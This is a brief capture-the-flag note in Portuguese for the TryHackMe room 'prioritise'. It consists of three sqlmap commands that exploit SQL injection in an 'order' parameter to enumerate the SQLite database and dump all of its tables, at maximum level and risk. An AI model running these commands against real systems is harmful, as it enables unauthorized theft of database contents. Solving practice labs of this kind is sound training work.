#ctf
https://tryhackme.com/room/prioritise

Só rodar os comandos abaixo

```sh
sqlmap -u http://IP/?order=title --dbs --level 5 --risk 3    
sqlmap -u http://IP/?order=title --dbms=SQLite --tables --level 5 --risk 3 --threads=10  
sqlmap -u http://IP/?order=title --dbms=SQLite --dump-all --level 5 --risk 3 --threads=10
```

